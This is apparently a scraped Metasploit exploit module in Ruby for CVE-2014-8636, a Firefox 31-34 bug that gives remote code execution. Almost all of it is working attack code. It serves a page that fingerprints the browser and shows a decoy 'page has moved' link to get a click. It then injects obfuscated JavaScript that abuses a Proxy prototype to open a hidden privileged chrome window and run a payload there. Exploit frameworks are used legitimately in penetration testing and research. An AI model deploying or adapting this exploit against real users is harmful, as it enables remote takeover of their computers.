# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rex/exploitation/jsobfu&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox Proxy Prototype Privileged Javascript Injection&#039;,
      &#039;Description&#039;    => %q{
        This exploit gains remote code execution on Firefox 31-34 by abusing a bug in the XPConnect
        component and gaining a reference to the privileged chrome:// window. This exploit
        requires the user to click anywhere on the page to trigger the vulnerability.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039;  => [
        &#039;joev&#039; # discovery and metasploit module
      ],
      &#039;DisclosureDate&#039; => "Jan 20 2014",
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-8636&#039;],
        [&#039;URL&#039;, &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=1120261&#039;],
        [&#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636&#039; ]
 
      ],
      &#039;Targets&#039; => [
        [
          &#039;Universal (Javascript XPCOM Shell)&#039;, {
            &#039;Platform&#039; => &#039;firefox&#039;,
            &#039;Arch&#039; => ARCH_FIREFOX
          }
        ],
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ java linux osx solaris win },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(31, 34) }
      }
    ))
 
    register_options([
      OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>." ])
    ], self.class)
  end
 
  def on_request_exploit(cli, request, target_info)
    send_response_html(cli, generate_html(target_info))
  end
 
  def default_html
    "The page has moved. <span style=&#039;text-decoration:underline;&#039;>Click here</span> to be redirected."
  end
 
  def generate_html(target_info)
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    frame = Rex::Text.rand_text_alpha(5 + rand(12))
    r = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin
 
    js = js_obfuscate %Q|
      var opts = #{JSON.unparse(opts)};
      var key = opts[&#039;#{key}&#039;];
      var props = {};
      props.has = function(n){
        if (!window.top.x && n==&#039;nodeType&#039;) {
          window.top.x=window.open("chrome://browser/content/browser.xul", "x",
            "chrome,,top=-9999px,left=-9999px,height=100px,width=100px");
          if (window.top.x) {
            Object.setPrototypeOf(document, pro);
            setTimeout(function(){
              x.location=&#039;data:text/html,<iframe mozbrowser src="about:blank"></iframe>&#039;;
 
              setTimeout(function(){
                x.messageManager.loadFrameScript(&#039;data:,&#039;+key, false);
                setTimeout(function(){
                  x.close();
                }, 100)
              }, 100)
            }, 100);
          }
        }
      }
      var pro = Object.getPrototypeOf(document);
      Object.setPrototypeOf(document, Proxy.create(props));
    |
 
    %Q|
      <!doctype html>
      <html>
        <body>
          <script>
            #{js}
          </script>
          #{datastore[&#039;CONTENT&#039;] || default_html}
        </body>
      </html>
    |
  end
end

